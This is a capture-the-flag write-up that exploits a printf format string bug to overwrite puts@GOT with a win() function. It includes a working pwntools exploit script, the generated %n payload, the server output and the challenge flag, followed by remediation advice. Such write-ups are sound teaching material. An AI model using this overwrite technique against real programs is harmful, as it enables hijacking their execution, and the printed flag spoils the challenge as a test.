# GOT me — Format String to GOT Overwrite (PWN)

**Writeup by Obito Uchiha** **Team AKATSUKI**

**Category:** PWN **CTF:** Black Hat Training Labs (FlagYard) **Challenge:** GOT me (Easy, 120 Points) **Author:** RakanNos **Flag:** `FlagY{deaae9aa5a06659170488c91da582321}`

---

## 1. Challenge Description

> A talkative program with a trusting nature — can you earn its trust and find a way to win?

We're given a 64-bit ELF binary (`got_me`) along with its source-level decompilation. The binary reads user input and prints it back — but _how_ it prints it back is the whole challenge.

---

## 2. Source Code Review

```c
undefined8 main(void)
{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Welcome to the Format Fest!");
  get_secret();
  return 0;
}

void get_secret(void)
{
  char local_88 [128];

  printf("Tell me something: ");
  fgets(local_88,0x80,stdin);
  printf(local_88);              // <-- vulnerable line
  puts("\nThanks for your input!");
  return;
}

void win(void)
{
  system("/bin/cat flag");
  return;
}
```

Three things stand out immediately:

1. **`printf(local_88)`** — user input is passed directly as the _format string_ argument to `printf`, instead of `printf("%s", local_88)`. This is a classic **format string vulnerability**.
2. There is a `win()` function that simply `cat`s the flag — but nothing in `main()` or `get_secret()` ever calls it.
3. Right after the vulnerable `printf`, the program calls `puts("\nThanks for your input!")`.

The challenge name — **"GOT me"** — is the hint: the intended solution is to abuse the format string bug to overwrite an entry in the **Global Offset Table (GOT)**, redirecting a legitimate function call to `win()` instead.

---

## 3. Understanding the Bug: Format String Vulnerability

`printf()` interprets its first argument as a format string containing specifiers like `%d`, `%s`, `%x`, `%p`, `%n`, etc. Normally, each specifier consumes one of the _additional_ arguments passed to `printf`.

When the attacker's **raw input** becomes the format string itself (no extra arguments are supplied), `printf` still tries to satisfy every specifier it finds — by pulling whatever values happen to be sitting on the stack (or in registers, per the calling convention) at that point. This gives an attacker two primitives:

- **Read primitive** — `%p` / `%x` / `%s` leak stack values, saved registers, and even pointers to strings (including the attacker's own buffer).
- **Write primitive** — `%n` (and its width-limited variants `%hn`, `%hhn`, `%lln`) writes the **number of bytes printed so far** to the address pointed to by the corresponding stack argument. This means an attacker can write **arbitrary values to arbitrary addresses** if they control both the address on the stack and the byte-count leading up to the `%n`.

This write primitive is exactly what we need to overwrite a GOT entry.

---

## 4. Recon: Binary Protections

```bash
$ checksec --file=./got_me
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

|Protection|Status|Relevance|
|---|---|---|
|**RELRO**|Partial|GOT is **writable** — required for a GOT-overwrite attack. Full RELRO would have made the GOT read-only after startup, blocking this approach entirely.|
|**Canary**|None|Not needed for this exploit (we aren't smashing the stack), but confirms no extra obstacle.|
|**NX**|Enabled|Stack isn't executable — irrelevant here since we never inject shellcode; we redirect execution to existing code (`win()`).|
|**PIE**|Disabled (base `0x400000`)|All addresses in the binary (functions, GOT entries) are **static** and known ahead of time, with no ASLR to defeat.|

This combination — **writable GOT + no PIE** — is the ideal setup for a format-string-driven GOT overwrite.

---

## 5. Finding the Format String Offset

To use `%n`-style writes, we first need to know **which argument position** on the stack corresponds to data _we_ control (i.e., the start of our own input buffer). We probe this with a pattern of `%p`:

```
Tell me something: AAAA.%p.%p.%p.%p.%p.%p.%p.%p
```

**Output:**

```
AAAA.0x7f1b05fa0963.0x7f1b05fa27a0.0x7f1b05fa27a0.(nil).(nil).0x2e70252e41414141.0x70252e70252e7025.0x252e70252e70252e
```

Looking at the 6th `%p`, we get `0x2e70252e41414141`. Since x86-64 is little-endian, reading this back byte-by-byte from the lowest address gives:

```
41 41 41 41 2e 25 70 2e  →  "AAAA.%p."
```

This is literally the start of our own input! That confirms:

**Offset = 6** — the 6th format-string argument (`%6$...`) refers to the start of our input buffer on the stack.

---

## 6. Choosing the Overwrite Target

The natural target is `printf`'s own GOT entry — overwrite it with `win()`'s address so that the _next_ `printf` call jumps to `win()` instead.

```bash
$ objdump -R ./got_me | grep printf
0000000000404028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
```

However, looking back at `get_secret()`, there is only **one** `printf()` call in the entire vulnerable function — the vulnerable one itself. By the time we overwrite `printf@GOT`, `printf` has already returned; there's no second `printf` call left to hijack.

Instead, the very next line calls:

```c
puts("\nThanks for your input!");
```

```bash
$ objdump -R ./got_me | grep puts
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

So we retarget the attack: **overwrite `puts@GOT` instead of `printf@GOT`**. When the program reaches the `puts(...)` call right after our format string executes, it will actually jump into `win()`.

```bash
$ objdump -d ./got_me | grep -A1 '<win>:'
00000000004011b6 <win>:
  4011b6:       f3 0f 1e fa    endbr64
```

**Target addresses:**

- `puts@GOT` = `0x404018`
- `win()` = `0x4011b6`

---

## 7. Building the Exploit

`pwntools`' `fmtstr_payload()` automates the entire `%n`-chain construction (splitting the target address into `%hhn`/`%hn`/`%lln` writes, ordering them, and padding byte counts):

```python
from pwn import *

context.binary = elf = ELF('./got_me')

puts_got = 0x404018
win_addr = 0x4011b6
offset   = 6

payload = fmtstr_payload(offset, {puts_got: win_addr})
print(payload)
```

**Generated payload:**

```
b'%182c%11$lln%91c%12$hhn%47c%13$hhnaaaaba\x18@@\x00\x00\x00\x00\x00\x19@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00'
```

This payload:

- Pads output with `%182c`, `%91c`, `%47c` etc. to control the exact byte-count printed before each `%n` write, so that each written chunk matches the correct byte of `win()`'s address.
- Uses `%11$lln`, `%12$hhn`, `%13$hhn` to write those chunks to the three appended addresses (`0x404018`, `0x404019`, `0x40401a`) embedded at the end of the payload — these are the individual bytes of `puts@GOT`, targeted separately for a precise partial write.

---

## 8. Delivering the Exploit over the Network

The challenge is served over `nc`, so the final script connects directly with `pwntools`:

```python
from pwn import *

context.binary = elf = ELF('./got_me')

p = remote('tcp.flagyard.com', 18212)

puts_got = 0x404018
win_addr = 0x4011b6
offset   = 6

payload = fmtstr_payload(offset, {puts_got: win_addr})

p.sendlineafter(b"Tell me something: ", payload)
p.interactive()
```

**Execution:**

```bash
$ python3 final.py
[+] Opening connection to tcp.flagyard.com on port 18212: Done
[*] Switching to interactive mode
...aaaaba\x18@@FlagY{deaae9aa5a06659170488c91da582321}
[*] Got EOF while reading in interactive
```

**Flag:** `FlagY{deaae9aa5a06659170488c91da582321}`

---

## 9. What Actually Happened at Runtime

1. `get_secret()` reads our payload into `local_88` via `fgets`.
2. `printf(local_88)` executes our format string. Because it contains `%n`-family specifiers pointed at `puts@GOT` (via the addresses appended to the payload and referenced by positional arguments `%11$`, `%12$`, `%13$`), `printf` **overwrites `puts`'s GOT entry byte-by-byte with `win()`'s address** as a side effect of formatting.
3. Execution returns from `printf` normally and reaches `puts("\nThanks for your input!")`.
4. The CPU looks up `puts` in the GOT to jump to its real implementation — but the GOT entry no longer points to libc's `puts`. It now points to **`win()`**.
5. `win()` executes: `system("/bin/cat flag")` — printing the flag directly into our shell.

---

## 10. Root Cause & Remediation

**Root cause:** User-controlled data was passed as the _format string_ argument to `printf` instead of as a plain data argument:

```c
printf(local_88);          // vulnerable
```

**Fix:**

```c
printf("%s", local_88);    // safe — input is treated as data, not format
```

**General mitigations:**

- Never pass user-controlled input directly as a format string to any `printf`-family function (`printf`, `fprintf`, `sprintf`, `syslog`, etc.).
- Compile with `-Wformat -Wformat-security` (and treat warnings as errors) to catch this class of bug at compile time.
- Enable **Full RELRO** where possible so the GOT becomes read-only after program startup, closing off GOT-overwrite as an exploitation path even if a format string bug exists elsewhere.
- Enable stack canaries and PIE/ASLR as defense-in-depth, though neither would have stopped this specific attack since it never touched the stack's return address or relied on leaking a runtime base address.

---

## 11. Summary

|Step|Detail|
|---|---|
|Vulnerability|Format string bug (`printf(local_88)`)|
|Primitive used|Arbitrary write via `%n`/`%hhn`/`%lln`|
|Offset found|6 (via `%p` probing)|
|Overwrite target|`puts@GOT` (`0x404018`)|
|Overwrite value|`win()` address (`0x4011b6`)|
|Why `puts` and not `printf`|Only one `printf` call existed in the vulnerable function; `puts` was the next GOT-resolved call reachable in the same execution|
|Enabling factors|Partial RELRO (writable GOT) + No PIE (static addresses)|
|Result|`win()` executed `system("/bin/cat flag")`, disclosing the flag|

**Flag:** `FlagY{deaae9aa5a06659170488c91da582321}`

---

_Writeup by Obito Uchiha — Team AKATSUKI_
